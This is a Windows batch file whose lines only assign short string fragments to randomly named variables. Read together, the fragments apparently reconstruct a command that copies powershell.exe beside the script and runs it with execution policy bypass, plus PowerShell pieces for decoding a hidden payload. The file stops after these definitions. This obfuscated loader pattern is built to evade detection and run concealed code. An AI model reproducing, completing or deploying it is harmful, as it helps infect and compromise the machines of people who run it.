@echo off
set "LhVIBnruwd=Po"
set "UtYKOIOhvU= /"
set "lzyYgriSJg=xe"
set "aZMaaAvvGn=ll"
set "JpMNdVkRVT=po"
set "xJWGVugfEE=Wi"
set "AevmsETreA=we"
set "lMcsXbHQmg=:\"
set "joefLNjfCO=y "
set "UklkXYGGwZ=em"
set "ZqFPXOdYJA=do"
set "mZZvgihqsx=.e"
set "MiAIXHVnNA=he"
set "xICFZyjcWF=ll"
set "HBhwvFKKsX=rs"
set "kWctcTLjkN=0\"
set "IpnMrSuXoK=he"
set "yGYDbMyjfd=in"
set "njjKPwFkaj=co"
set "IHDrYRAVUt=ow"
set "GEQaDfWGtM=nd"
set "UpYxPYnAqs=32"
set "ECoRunykqb=py"
set "BnPkmTrJtF=rS"
set "ebwzyPfEHe=st"
set "UygcoFmzKO=\W"
set "GIYjEElGHW=s\"
set "CEopkvejVs=ws"
set "WJtdbGWbOS=Sy"
set "WHbQvkQIUA=1."
set "ninDqdOYHI= C"
set "AJBHNPGLkP=we"
set "CMevQyrLwH=\v"
set "MhUGuPHuGo= %~dp0"
set "mRTcvrTspt=cd"
set "aRdJSjXFaZ=tem."
set "TbSHmKeXYl=bypa"
set "kHNLtWAGdu=; };"
set "SIstYLNwJU=();$"
set "hRZnQpMqMT=d;$h"
set "WCWdekeNWx=fZmT"
set "RxpKSWZzQF=e = "
set "XOFxDUCaOV=vj0m"
set "znJSOIGvdO=ct S"
set "BWBAyjNzGw=in $"
set "cOASGjLRnA=R.En"
set "UDcMtEbmPC=bstr"
set "AhyNfkikrn=$kRA"
set "LwwZveskin=Fo7l"
set "EbzhmDbdgy=lit("
set "JOVPiDUgfJ=7Yiv"
set "BblPiMqPjE=)($h"
set "eXLnRMsmyY=se()"
set "XJtwaNDPql=.Key"
set "IsowmQpmJm=);$e"
set "vcynbNEOfp=o.Pa"
set "hSFPzbmBQB=-1.."
set "GsVKZAXSdT=Obje"
set "UwHMyPBWqG=saBm"
set "lBiJVkCSur=$sno"
set "fYcwIZbhNW=3); "
set "xdVMBylDmF=1..-"
set "wcKnaQJWbb=raph"
set "gxatQMyjIH=yTo("
set "WpIVWTJxGy=gMod"
set "zYiBoMjtKq=).Sp"
